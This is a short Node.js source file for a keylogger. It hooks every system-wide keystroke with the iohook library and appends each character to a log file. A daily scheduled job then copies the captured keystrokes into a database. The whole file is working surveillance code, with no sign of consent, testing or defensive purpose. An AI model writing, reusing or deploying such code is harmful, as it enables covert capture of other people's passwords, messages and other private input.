const ioHook = require("iohook");
var cron = require("node-cron");
const db = require("./db");
const fileUtils = require("./fileUtils");

const filePath = "./log.txt";

ioHook.on("keydown", (e) => {
  let c = String.fromCharCode(e.rawcode);
  fileUtils.writeFile(filePath, c);
});

ioHook.start();

cron.schedule("0 30 6 * * *", async () => {
  console.log("cron running...");
  const data = await fileUtils.readFile(filePath);
  await db.insert(data);
  console.log("Done");
});
